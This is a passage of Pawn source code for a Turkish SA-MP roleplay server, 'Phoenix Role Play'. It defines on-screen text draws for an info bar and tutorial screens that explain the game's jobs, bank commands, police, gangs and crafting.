	TextDrawSetShadow(ZhaoByMetehan10, 0);

	ZhaoByMetehan11 = TextDrawCreate(261.333160, 306.967651, "LD_SPAC:white");
	TextDrawLetterSize(ZhaoByMetehan11, 0.000000, 0.000000);
	TextDrawTextSize(ZhaoByMetehan11, 107.000000, 2.000000);
	TextDrawAlignment(ZhaoByMetehan11, 1);
	TextDrawColor(ZhaoByMetehan11, COLOR_CYAN);
	TextDrawSetShadow(ZhaoByMetehan11, 0);
	TextDrawSetOutline(ZhaoByMetehan11, 0);
	TextDrawBackgroundColor(ZhaoByMetehan11, 255);
	TextDrawFont(ZhaoByMetehan11, 4);
	TextDrawSetProportional(ZhaoByMetehan11, 0);
	TextDrawSetShadow(ZhaoByMetehan11, 0);
	
	//------------------------------------------------------------------------------------------------------------
	// BÝLGÝLENDÝRME
	//------------------------------------------------------------------------------------------------------------
	mete0 = TextDrawCreate(0.666664, 431.103851, "box");
	TextDrawLetterSize(mete0, 0.000000, 1.700000);
	TextDrawTextSize(mete0, 675.000000, 0.000000);
	TextDrawAlignment(mete0, 1);
	TextDrawColor(mete0, -1);
	TextDrawUseBox(mete0, 1);
	TextDrawBoxColor(mete0, 102);
	TextDrawSetShadow(mete0, 0);
	TextDrawSetOutline(mete0, 0);
	TextDrawBackgroundColor(mete0, 255);
	TextDrawFont(mete0, 1);
	TextDrawSetProportional(mete0, 1);
	TextDrawSetShadow(mete0, 0);

	mete1 = TextDrawCreate(-1.666646, 429.474121, "LD_SPAC:white");
	TextDrawLetterSize(mete1, 0.000000, 0.000000);
	TextDrawTextSize(mete1, 25.000000, 19.000000);
	TextDrawAlignment(mete1, 1);
	TextDrawColor(mete1, COLOR_CYAN);
	TextDrawSetShadow(mete1, 0);
	TextDrawSetOutline(mete1, 0);
	TextDrawBackgroundColor(mete1, 255);
	TextDrawFont(mete1, 4);
	TextDrawSetProportional(mete1, 0);
	TextDrawSetShadow(mete1, 0);

	mete2 = TextDrawCreate(4.600017, 432.177917, "ld_pool:ball");
	TextDrawLetterSize(mete2, 0.000000, 0.000000);
	TextDrawTextSize(mete2, 14.000000, 13.000000);
	TextDrawAlignment(mete2, 1);
	TextDrawColor(mete2, -1);
	TextDrawSetShadow(mete2, 0);
	TextDrawSetOutline(mete2, 0);
	TextDrawBackgroundColor(mete2, 255);
	TextDrawFont(mete2, 4);
	TextDrawSetProportional(mete2, 0);
	TextDrawSetShadow(mete2, 0);

	mete3 = TextDrawCreate(4.533325, 432.189147, "/");
	TextDrawLetterSize(mete3, 0.398999, 1.355259);
	TextDrawAlignment(mete3, 1);
	TextDrawColor(mete3, -1);
	TextDrawSetShadow(mete3, 0);
	TextDrawSetOutline(mete3, 0);
	TextDrawBackgroundColor(mete3, 255);
	TextDrawFont(mete3, 1);
	TextDrawSetProportional(mete3, 1);
	TextDrawSetShadow(mete3, 0);

	bilgilen = TextDrawCreate(26.500028, 433.077972, " ");
	TextDrawLetterSize(bilgilen, 0.162666, 1.077333);
	TextDrawAlignment(bilgilen, 1);
	TextDrawColor(bilgilen, -1);
	TextDrawSetShadow(bilgilen, 0);
	TextDrawSetOutline(bilgilen, 1);
	TextDrawBackgroundColor(bilgilen, 255);
	TextDrawFont(bilgilen, 2);
	TextDrawSetProportional(bilgilen, 1);
	TextDrawSetShadow(bilgilen, 0);

	mete4 = TextDrawCreate(313.932952, 433.778045, "LD_SPAC:white");
	TextDrawLetterSize(mete4, 0.000000, 0.000000);
	TextDrawTextSize(mete4, 48.209964, 10.000000);
	TextDrawAlignment(mete4, 1);
	TextDrawColor(mete4, COLOR_CYAN);
	TextDrawSetShadow(mete4, 0);
	TextDrawSetOutline(mete4, 0);
	TextDrawBackgroundColor(mete4, 255);
	TextDrawFont(mete4, 4);
	TextDrawSetProportional(mete4, 0);
	TextDrawSetShadow(mete4, 0);

	mete5 = TextDrawCreate(318.600006, 433.318572, "Phoenix");
	TextDrawLetterSize(mete5, 0.231666, 0.957037);
	TextDrawAlignment(mete5, 1);
	TextDrawColor(mete5, -1);
	TextDrawSetShadow(mete5, 0);
	TextDrawSetOutline(mete5, 0);
	TextDrawBackgroundColor(mete5, 255);
	TextDrawFont(mete5, 2);
	TextDrawSetProportional(mete5, 1);
	TextDrawSetShadow(mete5, 0);

	mete6 = TextDrawCreate(488.666839, 429.773956, "LD_SPAC:white");
	TextDrawLetterSize(mete6, 0.000000, 0.000000);
	TextDrawTextSize(mete6, 21.000000, 19.000000);
	TextDrawAlignment(mete6, 1);
	TextDrawColor(mete6, COLOR_CYAN);
	TextDrawSetShadow(mete6, 0);
	TextDrawSetOutline(mete6, 0);
	TextDrawBackgroundColor(mete6, 255);
	TextDrawFont(mete6, 4);
	TextDrawSetProportional(mete6, 0);
	TextDrawSetShadow(mete6, 0);

	mete7 = TextDrawCreate(493.133361, 430.441680, "V");
	TextDrawLetterSize(mete7, 0.400000, 1.600000);
	TextDrawAlignment(mete7, 1);
	TextDrawColor(mete7, -1);
	TextDrawSetShadow(mete7, 0);
	TextDrawSetOutline(mete7, 0);
	TextDrawBackgroundColor(mete7, 255);
	TextDrawFont(mete7, 2);
	TextDrawSetProportional(mete7, 1);
	TextDrawSetShadow(mete7, 0);

	mete8 = TextDrawCreate(512.500244, 432.663238, "-_5.6.7");
	TextDrawLetterSize(mete8, 0.176666, 1.187852);
	TextDrawAlignment(mete8, 1);
	TextDrawColor(mete8, -1);
	TextDrawSetShadow(mete8, 0);
	TextDrawSetOutline(mete8, 1);
	TextDrawBackgroundColor(mete8, 255);
	TextDrawFont(mete8, 2);
	TextDrawSetProportional(mete8, 1);
	TextDrawSetShadow(mete8, 0);

	mete9 = TextDrawCreate(545.134094, 429.488739, "LD_SPAC:white");
	TextDrawLetterSize(mete9, 0.000000, 0.000000);
	TextDrawTextSize(mete9, 21.000000, 19.000000);
	TextDrawAlignment(mete9, 1);
	TextDrawColor(mete9, COLOR_CYAN);
	TextDrawSetShadow(mete9, 0);
	TextDrawSetOutline(mete9, 0);
	TextDrawBackgroundColor(mete9, 255);
	TextDrawFont(mete9, 4);
	TextDrawSetProportional(mete9, 0);
	TextDrawSetShadow(mete9, 0);

	mete10 = TextDrawCreate(550.467224, 430.441619, "$");
	TextDrawLetterSize(mete10, 0.400000, 1.600000);
	TextDrawAlignment(mete10, 1);
	TextDrawColor(mete10, -1);
	TextDrawSetShadow(mete10, 0);
	TextDrawSetOutline(mete10, 0);
	TextDrawBackgroundColor(mete10, 255);
	TextDrawFont(mete10, 2);
	TextDrawSetProportional(mete10, 1);
	TextDrawSetShadow(mete10, 0);

	mete11 = TextDrawCreate(568.833374, 432.792785, "-_Since_2016");
	TextDrawLetterSize(mete11, 0.176666, 1.187852);
	TextDrawAlignment(mete11, 1);
	TextDrawColor(mete11, -1);
	TextDrawSetShadow(mete11, 0);
	TextDrawSetOutline(mete11, 1);
	TextDrawBackgroundColor(mete11, 255);
	TextDrawFont(mete11, 2);
	TextDrawSetProportional(mete11, 1);
	TextDrawSetShadow(mete11, 0);

	mete12 = TextDrawCreate(21.666664, 429.703887, "LD_SPAC:white");
	TextDrawLetterSize(mete12, 0.000000, 0.000000);
	TextDrawTextSize(mete12, 625.000000, 1.000000);
	TextDrawAlignment(mete12, 1);
	TextDrawColor(mete12, COLOR_CYAN);
	TextDrawSetShadow(mete12, 0);
	TextDrawSetOutline(mete12, 0);
	TextDrawBackgroundColor(mete12, 255);
	TextDrawFont(mete12, 4);
	TextDrawSetProportional(mete12, 0);
	TextDrawSetShadow(mete12, 0);

	mete13 = TextDrawCreate(21.666664, 447.204956, "LD_SPAC:white");
	TextDrawLetterSize(mete13, 0.000000, 0.000000);
	TextDrawTextSize(mete13, 625.000000, 1.000000);
	TextDrawAlignment(mete13, 1);
	TextDrawColor(mete13, COLOR_CYAN);
	TextDrawSetShadow(mete13, 0);
	TextDrawSetOutline(mete13, 0);
	TextDrawBackgroundColor(mete13, 255);
	TextDrawFont(mete13, 4);
	TextDrawSetProportional(mete13, 0);
	TextDrawSetShadow(mete13, 0);
	
	
	//------------------------------------------------------------------------------------------------------------
	// Tutorial text draws
	//------------------------------------------------------------------------------------------------------------
	// Site Text
	site = TextDrawCreate(633.000000,412.000000," ");
	TextDrawFont(site,3);
	TextDrawSetShadow(site,0);
	TextDrawSetOutline(site,1);
	TextDrawAlignment(site,3);
	TextDrawLetterSize(site,0.399999,1.500000);
	TextDrawColor(site,COLOR_CYAN);

	TutTxtDraw[0] = TextDrawCreate(487.000000, 303.000000, "'");
	TextDrawBackgroundColor(TutTxtDraw[0], 255);
	TextDrawFont(TutTxtDraw[0], 2);
	TextDrawLetterSize(TutTxtDraw[0], 0.000000, 12.800003);
	TextDrawColor(TutTxtDraw[0], -1061109505);
	TextDrawSetOutline(TutTxtDraw[0], 0);
	TextDrawSetProportional(TutTxtDraw[0], 1);
	TextDrawSetShadow(TutTxtDraw[0], 1);
	TextDrawUseBox(TutTxtDraw[0], 1);
	TextDrawBoxColor(TutTxtDraw[0], 170);
	TextDrawTextSize(TutTxtDraw[0], 146.000000, 45.000000);

	TutTxtDraw[1] = TextDrawCreate(487.000000, 303.000000, "'");
	TextDrawBackgroundColor(TutTxtDraw[1], 255);
	TextDrawFont(TutTxtDraw[1], 1);
	TextDrawLetterSize(TutTxtDraw[1], 0.000000, -1.000000);
	TextDrawColor(TutTxtDraw[1], -1);
	TextDrawSetOutline(TutTxtDraw[1], 0);
	TextDrawSetProportional(TutTxtDraw[1], 1);
	TextDrawSetShadow(TutTxtDraw[1], 1);
	TextDrawUseBox(TutTxtDraw[1], 1);
	TextDrawBoxColor(TutTxtDraw[1], 255);
	TextDrawTextSize(TutTxtDraw[1], 146.000000, -2.000000);

	TutTxtDraw[2] = TextDrawCreate(487.000000, 427.000000, "'");
	TextDrawBackgroundColor(TutTxtDraw[2], 255);
	TextDrawFont(TutTxtDraw[2], 1);
	TextDrawLetterSize(TutTxtDraw[2], 0.000000, -1.000000);
	TextDrawColor(TutTxtDraw[2], -1);
	TextDrawSetOutline(TutTxtDraw[2], 0);
	TextDrawSetProportional(TutTxtDraw[2], 1);
	TextDrawSetShadow(TutTxtDraw[2], 1);
	TextDrawUseBox(TutTxtDraw[2], 1);
	TextDrawBoxColor(TutTxtDraw[2], 255);
	TextDrawTextSize(TutTxtDraw[2], 146.000000, -2.000000);

	TutTxtDraw[3] = TextDrawCreate(147.000000, 299.000000, "'");
	TextDrawBackgroundColor(TutTxtDraw[3], 255);
	TextDrawFont(TutTxtDraw[3], 1);
	TextDrawLetterSize(TutTxtDraw[3], 0.000000, 13.600002);
	TextDrawColor(TutTxtDraw[3], -1);
	TextDrawSetOutline(TutTxtDraw[3], 0);
	TextDrawSetProportional(TutTxtDraw[3], 1);
	TextDrawSetShadow(TutTxtDraw[3], 1);
	TextDrawUseBox(TutTxtDraw[3], 1);
	TextDrawBoxColor(TutTxtDraw[3], 255);
	TextDrawTextSize(TutTxtDraw[3], 146.000000, 28.000000);

	TutTxtDraw[4] = TextDrawCreate(487.000000, 299.000000, "'");
	TextDrawBackgroundColor(TutTxtDraw[4], 255);
	TextDrawFont(TutTxtDraw[4], 1);
	TextDrawLetterSize(TutTxtDraw[4], 0.000000, 13.600002);
	TextDrawColor(TutTxtDraw[4], -1);
	TextDrawSetOutline(TutTxtDraw[4], 0);
	TextDrawSetProportional(TutTxtDraw[4], 1);
	TextDrawSetShadow(TutTxtDraw[4], 1);
	TextDrawUseBox(TutTxtDraw[4], 1);
	TextDrawBoxColor(TutTxtDraw[4], 255);
	TextDrawTextSize(TutTxtDraw[4], 486.000000, 34.000000);

	TutTxtDraw[5] = TextDrawCreate(155.000000, 301.00000043425, "Phoenix Role Play Tanitim");
	TextDrawBackgroundColor(TutTxtDraw[5], 255);
	TextDrawFont(TutTxtDraw[5], 2);
	TextDrawLetterSize(TutTxtDraw[5], 0.500000, 2.200000);
	TextDrawColor(TutTxtDraw[5], COLOR_CYAN);
	TextDrawSetOutline(TutTxtDraw[5], 0);
	TextDrawSetProportional(TutTxtDraw[5], 1);
	TextDrawSetShadow(TutTxtDraw[5], 3);

	//
	// FIRST TUTORIAL TEXT
	//

	TutTxtDraw[6] = TextDrawCreate(166.000000, 331.000000, " Phoenix Role Play Roleplay serverine hosgeldiniz. Burasi bir Roleplay serveridir.");
	TextDrawBackgroundColor(TutTxtDraw[6], 255);
	TextDrawFont(TutTxtDraw[6], 1);
	TextDrawLetterSize(TutTxtDraw[6], 0.209999, 1.399999);
	TextDrawColor(TutTxtDraw[6], -1);
	TextDrawSetOutline(TutTxtDraw[6], 0);
	TextDrawSetProportional(TutTxtDraw[6], 1);
	TextDrawSetShadow(TutTxtDraw[6], 2);

	TutTxtDraw[7] = TextDrawCreate(166.000000, 344.000000, "Kendinize bir karakter belirlemeniz gerekmektedir. Polis, devlet adami normal bir insan,");
	TextDrawBackgroundColor(TutTxtDraw[7], 255);
	TextDrawFont(TutTxtDraw[7], 1);
	TextDrawLetterSize(TutTxtDraw[7], 0.209999, 1.399999);
	TextDrawColor(TutTxtDraw[7], -1);
	TextDrawSetOutline(TutTxtDraw[7], 0);
	TextDrawSetProportional(TutTxtDraw[7], 1);
	TextDrawSetShadow(TutTxtDraw[7], 2);

	TutTxtDraw[8] = TextDrawCreate(166.000000, 368.000000, "cete uyesi bile olabilirsin. Ayrica rol karakterini gercek hayattan ayirmalisin,");
	TextDrawBackgroundColor(TutTxtDraw[8], 255);
	TextDrawFont(TutTxtDraw[8], 1);
	TextDrawLetterSize(TutTxtDraw[8], 0.209999, 1.399999);
	TextDrawColor(TutTxtDraw[8], -1);
	TextDrawSetOutline(TutTxtDraw[8], 0);
	TextDrawSetProportional(TutTxtDraw[8], 1);
	TextDrawSetShadow(TutTxtDraw[8], 2);

	TutTxtDraw[9] = TextDrawCreate(166.000000, 381.000000, "biz bunu IC (Karakter ici) ve OOC(karakter disi) olarak,");
	TextDrawBackgroundColor(TutTxtDraw[9], 255);
	TextDrawFont(TutTxtDraw[9], 1);
	TextDrawLetterSize(TutTxtDraw[9], 0.209999, 1.399999);
	TextDrawColor(TutTxtDraw[9], -1);
	TextDrawSetOutline(TutTxtDraw[9], 0);
	TextDrawSetProportional(TutTxtDraw[9], 1);
	TextDrawSetShadow(TutTxtDraw[9], 2);

	TutTxtDraw[10] = TextDrawCreate(166.000000, 394.000000, "ikiye ayiriyoruz, bu cok onemlidir, o yuzden ikisini bir tutmayin.");
	TextDrawBackgroundColor(TutTxtDraw[10], 255);
	TextDrawFont(TutTxtDraw[10], 1);
	TextDrawLetterSize(TutTxtDraw[10], 0.209999, 1.399999);
	TextDrawColor(TutTxtDraw[10], -1);
	TextDrawSetOutline(TutTxtDraw[10], 0);
	TextDrawSetProportional(TutTxtDraw[10], 1);
	TextDrawSetShadow(TutTxtDraw[10], 2);

	//
	// SECOND TUTORIAL TEXT
	//

	TutTxtDraw[11] = TextDrawCreate(166.000000, 331.000000, "Phoenix Role Play'de para kazanilabilecek bir suru meslek bulunmaktadir,");
	TextDrawBackgroundColor(TutTxtDraw[11], 255);
	TextDrawFont(TutTxtDraw[11], 1);
	TextDrawLetterSize(TutTxtDraw[11], 0.209999, 1.399999);
	TextDrawColor(TutTxtDraw[11], -1);
	TextDrawSetOutline(TutTxtDraw[11], 0);
	TextDrawSetProportional(TutTxtDraw[11], 1);
	TextDrawSetShadow(TutTxtDraw[11], 2);

	TutTxtDraw[12] = TextDrawCreate(166.000000, 344.000000, "hizli ancak az para icin pizzacilik, yavas ama cok para icin ise kamyoncu olmanizi oneririz.");
	TextDrawBackgroundColor(TutTxtDraw[12], 255);
	TextDrawFont(TutTxtDraw[12], 1);
	TextDrawLetterSize(TutTxtDraw[12], 0.209999, 1.399999);
	TextDrawColor(TutTxtDraw[12], -1);
	TextDrawSetOutline(TutTxtDraw[12], 0);
	TextDrawSetProportional(TutTxtDraw[12], 1);
	TextDrawSetShadow(TutTxtDraw[12], 2);

	TutTxtDraw[13] = TextDrawCreate(166.000000, 357.000000, "Mesleklerin yerlerini ~r~/meslekler~w~ komutuyla ogrenebilirsin.");
	TextDrawBackgroundColor(TutTxtDraw[13], 255);
	TextDrawFont(TutTxtDraw[13], 1);
	TextDrawLetterSize(TutTxtDraw[13], 0.209998, 1.399999);
	TextDrawColor(TutTxtDraw[13], -1);
	TextDrawSetOutline(TutTxtDraw[13], 0);
	TextDrawSetProportional(TutTxtDraw[13], 1);
	TextDrawSetShadow(TutTxtDraw[13], 2);

	TutTxtDraw[14] = TextDrawCreate(166.000000, 381.000000, "Ayrica meslekler hakkinada bilgi almak icin ~r~/isyardim~w~ komutunu kullanabilirsin.");
	TextDrawBackgroundColor(TutTxtDraw[14], 255);
	TextDrawFont(TutTxtDraw[14], 1);
	TextDrawLetterSize(TutTxtDraw[14], 0.209998, 1.399999);
	TextDrawColor(TutTxtDraw[14], -1);
	TextDrawSetOutline(TutTxtDraw[14], 0);
	TextDrawSetProportional(TutTxtDraw[14], 1);
	TextDrawSetShadow(TutTxtDraw[14], 2);

	TutTxtDraw[15] = TextDrawCreate(166.000000, 394.000000, "Istedigin zaman bankadan ~r~/paracek~w~'ebilir ~w~ yada ~r~/parayatir~w~'abilirsin.~w~");
	TextDrawBackgroundColor(TutTxtDraw[15], 255);
	TextDrawFont(TutTxtDraw[15], 1);
	TextDrawLetterSize(TutTxtDraw[15], 0.209998, 1.399999);
	TextDrawColor(TutTxtDraw[15], -1);
	TextDrawSetOutline(TutTxtDraw[15], 0);
	TextDrawSetProportional(TutTxtDraw[15], 1);
	TextDrawSetShadow(TutTxtDraw[15], 2);

	//
	// THIRD TUTORIAL TEXT
	//

	TutTxtDraw[16] = TextDrawCreate(166.000000, 331.000000, "Los Santos sinirlari icerisinde ~b~LSPD~w~ ve ~b~FBI~w~  gibi devlet birimleri bulunmaktadir.");
	TextDrawBackgroundColor(TutTxtDraw[16], 255);
	TextDrawFont(TutTxtDraw[16], 1);
	TextDrawLetterSize(TutTxtDraw[16], 0.209999, 1.399999);
	TextDrawColor(TutTxtDraw[16], -1);
	TextDrawSetOutline(TutTxtDraw[16], 0);
	TextDrawSetProportional(TutTxtDraw[16], 1);
	TextDrawSetShadow(TutTxtDraw[16], 2);

	TutTxtDraw[17] = TextDrawCreate(166.000000, 344.000000, "Eger suc islersen seni hapse atacaklardir ve bu senin icin buyuk bela demek.");
	TextDrawBackgroundColor(TutTxtDraw[17], 255);
	TextDrawFont(TutTxtDraw[17], 1);
	TextDrawLetterSize(TutTxtDraw[17], 0.209999, 1.399999);
	TextDrawColor(TutTxtDraw[17], -1);
	TextDrawSetOutline(TutTxtDraw[17], 0);
	TextDrawSetProportional(TutTxtDraw[17], 1);
	TextDrawSetShadow(TutTxtDraw[17], 2);

	TutTxtDraw[18] = TextDrawCreate(166.000000, 357.000000, "Most Wanted(en cok aranan suclu) olabilirsin. (haritada kirmizi olarak gozukurler)");
	TextDrawBackgroundColor(TutTxtDraw[18], 255);
	TextDrawFont(TutTxtDraw[18], 1);
	TextDrawLetterSize(TutTxtDraw[18], 0.209998, 1.399999);
	TextDrawColor(TutTxtDraw[18], -1);
	TextDrawSetOutline(TutTxtDraw[18], 0);
	TextDrawSetProportional(TutTxtDraw[18], 1);
	TextDrawSetShadow(TutTxtDraw[18], 2);

	TutTxtDraw[19] = TextDrawCreate(166.000000, 371.000000, "Eger Most Wanted olarak yakalanirsan, seni 45 dakika hapse atabilirler.");
	TextDrawBackgroundColor(TutTxtDraw[19], 255);
	TextDrawFont(TutTxtDraw[19], 1);
	TextDrawLetterSize(TutTxtDraw[19], 0.209998, 1.399999);
	TextDrawColor(TutTxtDraw[19], -1);
	TextDrawSetOutline(TutTxtDraw[19], 0);
	TextDrawSetProportional(TutTxtDraw[19], 1);
	TextDrawSetShadow(TutTxtDraw[19], 2);

	TutTxtDraw[20] = TextDrawCreate(166.000000, 385.000000, "Eger hapiste yatamayacaksan, ozaman suc isleme.");
	TextDrawBackgroundColor(TutTxtDraw[20], 255);
	TextDrawFont(TutTxtDraw[20], 1);
	TextDrawLetterSize(TutTxtDraw[20], 0.209998, 1.399999);
	TextDrawColor(TutTxtDraw[20], -1);
	TextDrawSetOutline(TutTxtDraw[20], 0);
	TextDrawSetProportional(TutTxtDraw[20], 1);
	TextDrawSetShadow(TutTxtDraw[20], 2);

	TutTxtDraw[21] = TextDrawCreate(166.000000, 398.000000, "Bu olusumlara katilmak icin Phoenix Role Play forumlarindan basvuru yapabilirsin.");
	TextDrawBackgroundColor(TutTxtDraw[21], 255);
	TextDrawFont(TutTxtDraw[21], 1);
	TextDrawLetterSize(TutTxtDraw[21], 0.209998, 1.399999);
	TextDrawColor(TutTxtDraw[21], -1);
	TextDrawSetOutline(TutTxtDraw[21], 0);
	TextDrawSetProportional(TutTxtDraw[21], 1);
	TextDrawSetShadow(TutTxtDraw[21], 2);

	//
	// FOURTH TUTORIAL TEXT
	//

	TutTxtDraw[22] = TextDrawCreate(166.000000, 331.000000, "Eger yaralanirsan ~r~/olum kabul~w~ yada ~r~/cagir ambulans~w~ yazabilirsin.");
	TextDrawBackgroundColor(TutTxtDraw[22], 255);
	TextDrawFont(TutTxtDraw[22], 1);
	TextDrawLetterSize(TutTxtDraw[22], 0.209999, 1.399999);
	TextDrawColor(TutTxtDraw[22], -1);
	TextDrawSetOutline(TutTxtDraw[22], 0);
	TextDrawSetProportional(TutTxtDraw[22], 1);
	TextDrawSetShadow(TutTxtDraw[22], 2);

	TutTxtDraw[23] = TextDrawCreate(166.000000, 344.000000, "Ambulansý beklemen silahlarini kaybetmemeni saglayacaktir.");
	TextDrawBackgroundColor(TutTxtDraw[23], 255);
	TextDrawFont(TutTxtDraw[23], 1);
	TextDrawLetterSize(TutTxtDraw[23], 0.209999, 1.399999);
	TextDrawColor(TutTxtDraw[23], -1);
	TextDrawSetOutline(TutTxtDraw[23], 0);
	TextDrawSetProportional(TutTxtDraw[23], 1);
	TextDrawSetShadow(TutTxtDraw[23], 2);

	TutTxtDraw[24] = TextDrawCreate(166.000000, 357.000000, "Ayrica LSFMD olusumuna katilmak icin basvurabilirsin.");
	TextDrawBackgroundColor(TutTxtDraw[24], 255);
	TextDrawFont(TutTxtDraw[24], 1);
	TextDrawLetterSize(TutTxtDraw[24], 0.209998, 1.399999);
	TextDrawColor(TutTxtDraw[24], -1);
	TextDrawSetOutline(TutTxtDraw[24], 0);
	TextDrawSetProportional(TutTxtDraw[24], 1);
	TextDrawSetShadow(TutTxtDraw[24], 2);

	TutTxtDraw[25] = TextDrawCreate(166.000000, 371.000000, "Tum olusum basvurulari www.phoenix-roleplay.xyz uzerinden yapilmaktadir.");
	TextDrawBackgroundColor(TutTxtDraw[25], 255);
	TextDrawFont(TutTxtDraw[25], 1);
	TextDrawLetterSize(TutTxtDraw[25], 0.209998, 1.399999);
	TextDrawColor(TutTxtDraw[25], -1);
	TextDrawSetOutline(TutTxtDraw[25], 0);
	TextDrawSetProportional(TutTxtDraw[25], 1);
	TextDrawSetShadow(TutTxtDraw[25], 2);

	TutTxtDraw[26] = TextDrawCreate(166.000000, 394.000000, "Ayrica bir hastsalik kaparsan, hastane icerisinde kendini  ~r~/iyilestir~w~'ebilirsin.");
	TextDrawBackgroundColor(TutTxtDraw[26], 255);
	TextDrawFont(TutTxtDraw[26], 1);
	TextDrawLetterSize(TutTxtDraw[26], 0.209998, 1.399999);
	TextDrawColor(TutTxtDraw[26], -1);
	TextDrawSetOutline(TutTxtDraw[26], 0);
	TextDrawSetProportional(TutTxtDraw[26], 1);
	TextDrawSetShadow(TutTxtDraw[26], 2);

	//
	// FIFTH TUTORIAL TEXT
	//

	TutTxtDraw[27] = TextDrawCreate(166.000000, 331.000000, "Bu sunucuda ayrica ~r~/aileler~w~ yani bir nevi suc orgutleri bulunur.");
	TextDrawBackgroundColor(TutTxtDraw[27], 255);
	TextDrawFont(TutTxtDraw[27], 1);
	TextDrawLetterSize(TutTxtDraw[27], 0.209999, 1.399999);
	TextDrawColor(TutTxtDraw[27], -1);
	TextDrawSetOutline(TutTxtDraw[27], 0);
	TextDrawSetProportional(TutTxtDraw[27], 1);
	TextDrawSetShadow(TutTxtDraw[27], 2);

	TutTxtDraw[28] = TextDrawCreate(166.000000, 344.000000, "Bu orgutler sokak ceteleri ve organize olmus mafyalar olarak ikiye ayrilir.");
	TextDrawBackgroundColor(TutTxtDraw[28], 255);
	TextDrawFont(TutTxtDraw[28], 1);
	TextDrawLetterSize(TutTxtDraw[28], 0.209999, 1.399999);
	TextDrawColor(TutTxtDraw[28], -1);
	TextDrawSetOutline(TutTxtDraw[28], 0);
	TextDrawSetProportional(TutTxtDraw[28], 1);
	TextDrawSetShadow(TutTxtDraw[28], 2);

	TutTxtDraw[29] = TextDrawCreate(166.000000, 357.000000, "Bu ceteler/aileler ayrica bazi mekanlari ele gecirmek icin savasirlar ~r~/pointler~w~.");
	TextDrawBackgroundColor(TutTxtDraw[29], 255);
	TextDrawFont(TutTxtDraw[29], 1);
	TextDrawLetterSize(TutTxtDraw[29], 0.209998, 1.399999);
	TextDrawColor(TutTxtDraw[29], -1);
	TextDrawSetOutline(TutTxtDraw[29], 0);
	TextDrawSetProportional(TutTxtDraw[29], 1);
	TextDrawSetShadow(TutTxtDraw[29], 2);

	TutTxtDraw[30] = TextDrawCreate(166.000000, 381.000000, "Oyun icerisinde bu ailelere yaklasip, bag kurup katilabilirsiniz");
	TextDrawBackgroundColor(TutTxtDraw[30], 255);
	TextDrawFont(TutTxtDraw[30], 1);
	TextDrawLetterSize(TutTxtDraw[30], 0.209998, 1.399999);
	TextDrawColor(TutTxtDraw[30], -1);
	TextDrawSetOutline(TutTxtDraw[30], 0);
	TextDrawSetProportional(TutTxtDraw[30], 1);
	TextDrawSetShadow(TutTxtDraw[30], 2);

	TutTxtDraw[31] = TextDrawCreate(166.000000, 394.000000, "Bu aileler/ceteler genellikle kendi mekanlarinda, kuluplerinde, barlarinda bulunurlar.");
	TextDrawBackgroundColor(TutTxtDraw[31], 255);
	TextDrawFont(TutTxtDraw[31], 1);
	TextDrawLetterSize(TutTxtDraw[31], 0.209998, 1.399999);
	TextDrawColor(TutTxtDraw[31], -1);
	TextDrawSetOutline(TutTxtDraw[31], 0);
	TextDrawSetProportional(TutTxtDraw[31], 1);
	TextDrawSetShadow(TutTxtDraw[31], 2);

	//
	// SIXTH TUTORIAL TEXT
	//

	TutTxtDraw[32] = TextDrawCreate(166.000000, 331.000000, "Kendine materyal kasarak, bu materyallerle bazi esyalar yapabilirsin.(silahlar dahil)");
	TextDrawBackgroundColor(TutTxtDraw[32], 255);
	TextDrawFont(TutTxtDraw[32], 1);
	TextDrawLetterSize(TutTxtDraw[32], 0.209999, 1.399999);
	TextDrawColor(TutTxtDraw[32], -1);
	TextDrawSetOutline(TutTxtDraw[32], 0);
	TextDrawSetProportional(TutTxtDraw[32], 1);
	TextDrawSetShadow(TutTxtDraw[32], 2);

	TutTxtDraw[33] = TextDrawCreate(166.000000, 344.000000, "Materyal kasmak ve esya yapmak icin zanaatkar yada, silah saticisi olman gerekmektedir.");
	TextDrawBackgroundColor(TutTxtDraw[33], 255);
	TextDrawFont(TutTxtDraw[33], 1);
	TextDrawLetterSize(TutTxtDraw[33], 0.209999, 1.399999);
	TextDrawColor(TutTxtDraw[33], -1);
	TextDrawSetOutline(TutTxtDraw[33], 0);
	TextDrawSetProportional(TutTxtDraw[33], 1);
	TextDrawSetShadow(TutTxtDraw[33], 2);

	TutTxtDraw[34] = TextDrawCreate(166.000000, 357.000000, "Materyal pakedi alma noktalarinda ~r~/paketal~w~ yazarak mallari adreslere teslim etmen gerek.");
	TextDrawBackgroundColor(TutTxtDraw[34], 255);
	TextDrawFont(TutTxtDraw[34], 1);
	TextDrawLetterSize(TutTxtDraw[34], 0.209998, 1.399999);
	TextDrawColor(TutTxtDraw[34], -1);
	TextDrawSetOutline(TutTxtDraw[34], 0);
	TextDrawSetProportional(TutTxtDraw[34], 1);
	TextDrawSetShadow(TutTxtDraw[34], 2);

	TutTxtDraw[35] = TextDrawCreate(166.000000, 371.000000, "Yeterli materyalin olunca ~r~/silahsat~w~ yada ~r~/zanaat~w~ komutlarini kullanabilirsin.");
	TextDrawBackgroundColor(TutTxtDraw[35], 255);
	TextDrawFont(TutTxtDraw[35], 1);
	TextDrawLetterSize(TutTxtDraw[35], 0.209998, 1.399999);
	TextDrawColor(TutTxtDraw[35], -1);
	TextDrawSetOutline(TutTxtDraw[35], 0);
	TextDrawSetProportional(TutTxtDraw[35], 1);
	TextDrawSetShadow(TutTxtDraw[35], 2);

	TutTxtDraw[36] = TextDrawCreate(166.000000, 391.000000, "Daha fazla bilgi almak icin ~r~/isyardim~w~ komutunu yazabilirsin.");
	TextDrawBackgroundColor(TutTxtDraw[36], 255);
	TextDrawFont(TutTxtDraw[36], 1);
	TextDrawLetterSize(TutTxtDraw[36], 0.209998, 1.399999);
	TextDrawColor(TutTxtDraw[36], -1);
	TextDrawSetOutline(TutTxtDraw[36], 0);
	TextDrawSetProportional(TutTxtDraw[36], 1);
	TextDrawSetShadow(TutTxtDraw[36], 2);

	//
	// SEVENTH TUTORIAL TEXT
	//

	TutTxtDraw[37] = TextDrawCreate(166.000000, 331.000000, "Ayrica Los Santos'a Blueberry'den uyusturucu kacirabilirsin. Uyusturucu kacakcisi meslegini,");
	TextDrawBackgroundColor(TutTxtDraw[37], 255);
	TextDrawFont(TutTxtDraw[37], 1);
	TextDrawLetterSize(TutTxtDraw[37], 0.209999, 1.399999);
	TextDrawColor(TutTxtDraw[37], -1);
	TextDrawSetOutline(TutTxtDraw[37], 0);
	TextDrawSetProportional(TutTxtDraw[37], 1);
	TextDrawSetShadow(TutTxtDraw[37], 2);

